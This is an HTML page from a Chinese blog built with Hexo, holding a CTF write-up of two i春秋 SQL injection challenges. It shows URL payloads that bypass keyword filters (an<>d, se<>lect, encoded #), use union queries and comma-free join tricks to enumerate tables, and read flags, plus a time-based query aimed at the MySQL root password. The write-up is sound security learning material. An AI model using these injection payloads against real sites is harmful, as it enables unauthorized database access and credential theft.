@@ -1,0 +1,246 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://yoursite.com">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://yoursite.com">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://yoursite.com">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
+<meta name="author" content="John Doe">
+<link rel="stylesheet" href="/css/JSimple.css">
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>i 春秋 sql - Hexo</title>
+
+<meta name="keywords" content>
+
+<meta name="description " content>
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-telegram">
+        <a href="http://t.me/kunyintang" target="_blank" title="telegram" ref="friend">
+            <i class="fa fa-telegram"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+        
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text" readonly="readonly" id="local-search-input-tip" placeholder="click to search...">
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://shuoit.net" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar">
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://shuoit.net" target="_blank">纠结伦</a>
+                    <span title="Last edited at&nbsp;2019-04-01">2019-04-01</span>
+                </p>
+                <p>一个搬🧱的劳斯基😁️️</p>
+            </div>
+            <h2 class="post-title">i 春秋 sql</h2>
+            <div class="post-meta">
+                emm... 4585 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>最近做了i春秋上的两道sql注入题，很有特色，学到了不少东西。。。。</p>
+<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>第一步：判断是否存在注入<br><a href="http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1&#39;#" target="_blank" rel="noopener">http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1&#39;#</a><br>错误。。说明存在注入。。<br>第二步：判断为数字注入还是字符注入<br><a href="http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1" target="_blank" rel="noopener">http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1</a> and 1=1<br>显示页面错误，不知道什么什么情况，怀疑是否and被过滤了，试了an/**/d，结果，无显示。。<br>换成1=2也是如此。。。。。<br>再试试是否为字符型：<br><a href="http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=&#39;1&#39;" target="_blank" rel="noopener">http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=&#39;1&#39;</a> and ‘1’=’1<br>这个显示 inj code!<br>说明应该是数字型啊！！<br>后来看了别人的wp，才发现原来可以这种an&lt;&gt;d防过滤的方法。。<br><a href="http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1" target="_blank" rel="noopener">http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1</a> an&lt;&gt;d 1=1 正确。<br><a href="http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1" target="_blank" rel="noopener">http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1</a> an&lt;&gt;d 1=2 无显示<br>说明为数字型<br>第三步：判断数目<br><a href="http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1" target="_blank" rel="noopener">http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1</a> order by 3#<br>错误。。。<br><a href="http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1" target="_blank" rel="noopener">http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1</a> ord&lt;&gt;er by 3#<br>正确。注意：or&lt;&gt;der 错误，因为or也是被过滤的，好坑。。。。<br><a href="http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1" target="_blank" rel="noopener">http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1</a> union se&lt;&gt;lect 1,2,3#<br>显示2，在二处注入<br>第四步：开始爆出数据库，表，列，数据<br>1.<a href="http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1" target="_blank" rel="noopener">http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1</a> union se&lt;&gt;lect 1,database(),3<br>2.<a href="http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1" target="_blank" rel="noopener">http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1</a> union se&lt;&gt;lect 1,table_name,3 from information_schema.tables where table_schema=’sqli’#<br>3.<a href="http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1" target="_blank" rel="noopener">http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1</a> union se&lt;&gt;lect 1,columu_name,3 from information_schema.columns where table_schema=’sqli’ an&lt;&gt;d table_name=’info’#<br>4.<a href="http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1" target="_blank" rel="noopener">http://55658231bb234a21ad078e213a230c60a0897bf6fedb4ae0.changame.ichunqiu.com/index.php?id=1</a> union se&lt;&gt;lect 1,flAg_T5ZNdrm,3 from info#<br>最后出结果。。。</p>
+<h1 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h1><p>这个题有坑，很大的坑，看了别人的wp才知道。。。。<br>可是我看了知道有重定向，重定向。。。找不到。。<br>后来才知道在访问这个网址时出现的。<br><a href="http://5e7fa4cbed9442ab94218fc91d9249093752a02e00e2416d.changame.ichunqiu.com" target="_blank" rel="noopener">http://5e7fa4cbed9442ab94218fc91d9249093752a02e00e2416d.changame.ichunqiu.com</a></p>
+<h2 id="这里有一个技巧：重定向一般发生在访问域名而且不加参数或者文件夹名，文件名这样的情况下，比如直接访问-http-5e7fa4cbed9442ab94218fc91d9249093752a02e00e2416d-changame-ichunqiu-com-就会重定向到一个默认的页面文件。因该记住这个套路。"><a href="#这里有一个技巧：重定向一般发生在访问域名而且不加参数或者文件夹名，文件名这样的情况下，比如直接访问-http-5e7fa4cbed9442ab94218fc91d9249093752a02e00e2416d-changame-ichunqiu-com-就会重定向到一个默认的页面文件。因该记住这个套路。" class="headerlink" title="这里有一个技巧：重定向一般发生在访问域名而且不加参数或者文件夹名，文件名这样的情况下，比如直接访问 http://5e7fa4cbed9442ab94218fc91d9249093752a02e00e2416d.changame.ichunqiu.com 就会重定向到一个默认的页面文件。因该记住这个套路。"></a>这里有一个技巧：重定向一般发生在访问域名而且不加参数或者文件夹名，文件名这样的情况下，比如直接访问 <a href="http://5e7fa4cbed9442ab94218fc91d9249093752a02e00e2416d.changame.ichunqiu.com" target="_blank" rel="noopener">http://5e7fa4cbed9442ab94218fc91d9249093752a02e00e2416d.changame.ichunqiu.com</a> 就会重定向到一个默认的页面文件。因该记住这个套路。</h2><p>结果：<br><img src="/2019/04/01/i-春秋-sql/i-春秋-sql-13ba1257.PNG" alt><br>这个结果，好意外。。。<br>然后开始注入，注入也有毒。。。<br>先尝试：<br><a href="http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1&#39;" target="_blank" rel="noopener">http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1&#39;</a><br>返回1’,说明id存在注入<br><a href="http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1" target="_blank" rel="noopener">http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1</a> and 1 页面正常<br><a href="http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1" target="_blank" rel="noopener">http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1</a> and 0 页面正常<br>有点问题啊，再试试字符注入呢<br><a href="http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1&#39;" target="_blank" rel="noopener">http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1&#39;</a> and ‘1 页面正常<br><a href="http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1&#39;" target="_blank" rel="noopener">http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1&#39;</a> and ‘0 页面错误<br>说明是字符注入<br>可以从题目中看出order by 2<br>验证一下，也可以看看是否有什么过滤<br><a href="http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1&#39;" target="_blank" rel="noopener">http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1&#39;</a> order by 2#<br>发现#被过滤掉了，用url码换一下<br><a href="http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1&#39;" target="_blank" rel="noopener">http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1&#39;</a> order by 2%23 正常<br>接下来判断在哪个位置注入：<br><a href="http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1&#39;" target="_blank" rel="noopener">http://39b78e8fa46e4db8b815ac38956e76ad82550a249d9f4e0d.changame.ichunqiu.com/l0gin.php?id=1&#39;</a> union select 1,2%23<br>逗号本身及其后边全被过滤掉了<br>这次url也不管事了。。。<br>下面有几种大佬总结不用逗号的过滤方法：<br>1.select <em> from table1 where id =1 and exists (select </em> from table2 where ord(substring(username from 1 for 1)=97);</p>
+<p>2.127’ UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)#</p>
+<p>3.select case when substring((select password from mysql.user where user=’root’) from 1 for 1)=’e’ then sleep(5) else 0 end #</p>
+<p>4.substring((select password from mysql.user where user=’root’) from -1）=’e’</p>
+<p>选第二种看一看：<br><a href="http://cd29110264c948b191c510bf6baed333c46e26b869534f09.changame.ichunqiu.com/l0gin.php?id=-1&#39;" target="_blank" rel="noopener">http://cd29110264c948b191c510bf6baed333c46e26b869534f09.changame.ichunqiu.com/l0gin.php?id=-1&#39;</a>  union select * from (select 1) a join (select database() ) b %23<br><img src="/2019/04/01/i-春秋-sql/i-春秋-sql-f3ba4444.PNG" alt></p>
+<p><a href="http://cd29110264c948b191c510bf6baed333c46e26b869534f09.changame.ichunqiu.com/l0gin.php?id=-1&#39;" target="_blank" rel="noopener">http://cd29110264c948b191c510bf6baed333c46e26b869534f09.changame.ichunqiu.com/l0gin.php?id=-1&#39;</a>  union select * from (select 1) a join (select group_concat(table_name) from information_schema.tables where table_schema=’sqli’ ) b %23</p>
+<p><img src="/2019/04/01/i-春秋-sql/i-春秋-sql-078487f8.PNG" alt></p>
+<p><a href="http://cd29110264c948b191c510bf6baed333c46e26b869534f09.changame.ichunqiu.com/l0gin.php?id=-1&#39;" target="_blank" rel="noopener">http://cd29110264c948b191c510bf6baed333c46e26b869534f09.changame.ichunqiu.com/l0gin.php?id=-1&#39;</a>  union select * from (select 1) a join (select group_concat(column_name) from information_schema.columns where table_name=’users’ ) b %23</p>
+<p><img src="/2019/04/01/i-春秋-sql/i-春秋-sql-3e815fac.PNG" alt></p>
+<p><a href="http://cd29110264c948b191c510bf6baed333c46e26b869534f09.changame.ichunqiu.com/l0gin.php?id=-1&#39;" target="_blank" rel="noopener">http://cd29110264c948b191c510bf6baed333c46e26b869534f09.changame.ichunqiu.com/l0gin.php?id=-1&#39;</a>  union select * from (select 1) a join (select flag_9c861b688330 from users ) b %23</p>
+<p><img src="/2019/04/01/i-春秋-sql/i-春秋-sql-3e815fac.PNG" alt></p>
+<p>结束！！！！<br>后记：本来做题做的好好的，结果有点累，翻了一会手机，看到了哥哥和唐先生，今天4月1日啊！！！！！！一直没有勇气打开微博，怕受不了，果然，抱着舍友哭了一晚上。。。。。后来肿着眼睛把这个做完了。。哥哥，唐先生，万望君安。。。。。。。。。。。。。</p>
+
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/ctf-sql/">ctf  sql</a>
+            
+        </div>
+        
+    </article>
+    
+    <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+
+    
+
+</div>
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about" title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help">Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://shuoit.net" target="_blank" rel="friend">纠结伦</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+<script src="/js/SimpleCore.js"></script>
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input" spellcheck="false" type="text" autocomplete="off" placeholder="Input query keywords here...">
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+        SimpleCore.init(jsi_config);
+        
+    });
+</script>
+</body>
+</html>
